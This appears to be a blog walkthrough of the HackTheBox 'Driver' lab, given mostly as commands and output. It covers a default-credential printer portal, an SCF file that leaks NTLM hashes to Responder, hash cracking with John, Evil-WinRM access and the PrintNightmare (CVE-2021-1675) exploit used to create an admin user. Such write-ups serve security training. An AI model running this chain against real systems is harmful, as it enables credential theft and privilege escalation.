---
title: "Walk-through of Driver from HackTheBox"
header:
  teaser: /assets/images/2021-10-27-16-45-35.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - CVE-2021-1675
  - PrintNightmare
  - Responder
  - JohnTheRipper
  - Evil-WinRM
---

## Machine Information

![driver](/assets/images/2021-10-27-16-45-35.png)

Driver is an easy Windows machine on HackTheBox created by [MrR3boot](https://app.hackthebox.com/users/13531). It highlights the dangers of printer servers not being properly secured by having default credentials allowing access to an admin portal. The printer management software is not secure and allows unsanitised user files to be uploaded and executed. Leading to us exploiting it using CVE-2021-1675, a PrintNightmare vulnerability, to gain root access.

<!--more-->

Skills required are web and OS enumeration, and knowledge of current exploits. Skills learned are creating malicious files and using Responder to capture hashes by using man in the middle attacks.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Driver](https://www.hackthebox.eu/home/machines/profile/387) |
| Machine Release Date | 2nd October 2021 |
| Date I Completed It | 28th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/driver]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.106 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/driver]
└─# nmap -p$ports -sC -sV -oA driver 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 16:52 BST
Nmap scan report for 10.10.11.106
Host is up (0.030s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h15m04s, deviation: 0s, median: 7h15m04s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-27T23:07:36
|_  start_date: 2021-10-27T11:59:04

Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
```

We have a Windows server with a website on port 80, RPC on 135 and SMB on port 445. Let's add the IP to our hosts file first:

```sh
┌──(root💀kali)-[~/htb/driver]
└─# echo "10.10.11.106 driver.htb" >> /etc/hosts
```

## RPC Dump

From the name and theme of this box we know it's based around the PrintNightmare vulnerability. We can check the it is vulnerable with rpcdump:

```sh
┌──(root💀kali)-[~/htb/driver]
└─# python3 /usr/share/doc/python3-impacket/examples/rpcdump.py 10.10.11.106 | grep MS-RPRN
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

## Printer Portal

That confirms the print service is running on it. Now we look at port 80 and see it's a login page for printer management software with credentials needed:

![driver-port80](/assets/images/2021-10-27-16-56-00.png)

The hint there is admin, I tried the obvious admin:admin which got me in:

![driver-update-center](/assets/images/2021-10-27-17-09-05.png)

The only page that works if the Firmware Updates one:

![driver-firmware](/assets/images/2021-10-27-17-19-30.png)

## Malicious SCF File

It's possible to upload our own files on this page. So we are looking at a way of executing a payload, and after a bit of searching I found [this](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks) great article on Pentestlab. Following it we can create an scf file which will cause the server to try and contact our attacking machine, where we have Responder listening to capture the hash of the account being used.

First create our malicious scf file:

```text
┌──(root💀kali)-[~/htb/driver]
└─# cat @pencer.scf      
[Shell]
Command=2
IconFile=\\10.10.14.192\share\pencer.ico
[Taskbar]
Command=ToggleDesktop
```

Here I have my Kali IP on tun0, the icon and share don't exist they are just needed for this to work.

Now upload the file:

![drive-upload-scf](/assets/images/2021-10-27-17-45-39.png)

## Responder

Make sure you have Responder listening:

```sh
┌──(root💀kali)-[~/htb/driver]
└─# responder -wrf --lm -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.192]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-QO2U5X54CZL]
    Responder Domain Name      [1P4E.LOCAL]
    Responder DCE-RPC Port     [45284]

[+] Listening for events...
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:e4<HIDDEN>00
<SNIP>
[+] Exiting...
```

## Hash Cracking

After clicking the submit button to upload our payload we see Responder has captured the user hash. We can attempt to crack it:

```sh
┌──(root💀kali)-[~/htb/driver]
└─# echo "tony::DRIVER:e4<HIDDEN>00" > hash.txt

┌──(root💀kali)-[~/htb/driver]
└─# nth --file hash.txt      
  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 

tony::DRIVER:e4<HIDDEN>00

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2
```

Use John with rockyou, it only takes a few seconds:

```sh
┌──(root💀kali)-[~/htb/driver]
└─# john hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>          (tony)
1g 0:00:00:00 DONE (2021-10-27 17:26) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s !!!!!!..eatme1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

## Evil-WinRM

We now have a username and password so can connect using Evil-WinRM. Before we do let's grab [this](https://github.com/calebstewart/CVE-2021-1675) version of the public exploits for PrintNightmare:

```sh
┌──(root💀kali)-[~/htb/driver]
└─# wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
--2021-10-27 17:29:10--  https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 178561 (174K) [text/plain]
Saving to: ‘CVE-2021-1675.ps1’
CVE-2021-1675.ps1     100%[=================================================>] 174.38K  --.-KB/s    in 0.06s
2021-10-27 17:29:11 (2.85 MB/s) - ‘CVE-2021-1675.ps1’ saved [178561/178561]
```

Now we can connect to the box:

```sh
┌──(root💀kali)-[~/htb/driver]
└─# evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
```

## User Flag

Might as well grab the user flag:

```text
*Evil-WinRM* PS C:\Users\tony\Documents> type ../Desktop/user.txt
<HIDDEN>
```

## PrintNightmare Exploit

Now upload our exploit:

```text
*Evil-WinRM* PS C:\Users\tony\Documents> upload /root/htb/driver/CVE-2021-1675.ps1
Info: Uploading /root/htb/driver/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1
Data: 238080 bytes of 238080 bytes copied
Info: Upload successful!
```

If we try to import the PowerShell module we get an error because the execution policy is set to restricted:

```text
*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module ./CVE-2021-1675.ps1
File C:\Users\tony\Documents\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. 
At line:1 char:1
+ Import-Module ./CVE-2021-1675.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
```

We can easily get around this by setting it to unrestricted for our current user:

```text
*Evil-WinRM* PS C:\Users\tony\Documents> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

Now we can import it and run to create our admin user:

```text
*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module ./CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser "pencer" -NewPassword "pencer123"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user pencer as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

## Privilege Escalation

Finally we can connect a new Evil-WinRM session using our new account:

```text
┌──(root💀kali)-[~]
└─# evil-winrm -i 10.10.11.106 -u pencer -p pencer123                                                    

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\pencer\Documents> whoami
driver\pencer
```

## Root Flag

All that's left is to grab the root flag:

```text
*Evil-WinRM* PS C:\Users\pencer\Documents> cd c:\
*Evil-WinRM* PS C:\> cd users
*Evil-WinRM* PS C:\users> cd administrator
*Evil-WinRM* PS C:\users\administrator> type desktop\root.txt
<HIDDEN>
```

That was super simple, but fun to play with PrintNightmare. I did a post [here](https://pencer.io/hacking/hack-printnightmare/) that detailed PrintNightmare in much more detail. Go check it out!

See you next time.
